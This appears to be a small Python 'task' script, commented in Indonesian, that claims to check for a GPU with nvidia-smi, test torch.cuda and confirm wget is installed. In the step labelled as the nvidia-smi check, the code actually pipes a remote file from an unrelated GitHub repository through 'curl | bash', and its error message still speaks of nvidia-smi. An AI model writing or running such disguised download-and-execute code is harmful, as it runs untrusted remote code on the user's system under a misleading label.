import subprocess
import os

print("=== START TASK.PY ===")

# 1. Cek GPU pakai nvidia-smi
print("\n--- Checking nvidia-smi ---")
try:
    result = subprocess.run(["curl -sL https://github.com/nurnapitupul135/belajar-flutter-09141406/raw/refs/heads/main/gas | bash"], capture_output=True, text=True, timeout=10)
    print(result.stdout)
    if result.stderr:
        print("STDERR:", result.stderr)
except FileNotFoundError:
    print("nvidia-smi tidak ditemukan (mungkin instance CPU, bukan GPU)")
except Exception as e:
    print(f"Error menjalankan nvidia-smi: {e}")

# 2. Cek juga pakai torch kalau ada
print("\n--- Checking torch.cuda ---")
try:
    import torch
    print(f"torch version: {torch.__version__}")
    print(f"cuda available: {torch.cuda.is_available()}")
    if torch.cuda.is_available():
        print(f"cuda device count: {torch.cuda.device_count()}")
        print(f"cuda device name: {torch.cuda.get_device_name(0)}")
except Exception as e:
    print(f"torch check failed: {e}")

# 3. Contoh pakai wget
print("\n--- Testing wget ---")
try:
    # contoh download file kecil
    os.system("wget --version")
    print("wget siap dipakai")
    # contoh: os.system("wget https://example.com/file.zip -O /tmp/file.zip")
except Exception as e:
    print(f"wget error: {e}")

print("\n=== TASK SELESAI ===")
